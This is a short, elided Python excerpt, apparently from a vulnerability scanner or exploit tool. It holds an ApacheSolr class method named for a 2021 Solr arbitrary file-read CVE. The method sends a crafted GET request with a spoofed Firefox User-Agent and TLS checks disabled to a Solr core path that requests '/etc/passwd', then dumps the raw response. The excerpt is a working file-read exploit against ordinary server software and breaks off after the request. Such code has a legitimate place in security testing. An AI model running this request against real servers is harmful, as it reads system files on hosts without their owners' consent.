...
class ApacheSolr():
    ...
    def cve_20210408_filereading(self):
        ...
        self.data = r''
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*'}
        try:
            if VULN == 'False':
                self.request = requests.get(self.url + self.path.format(self.corename,'/etc/passwd'), data=self.data, headers=self.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
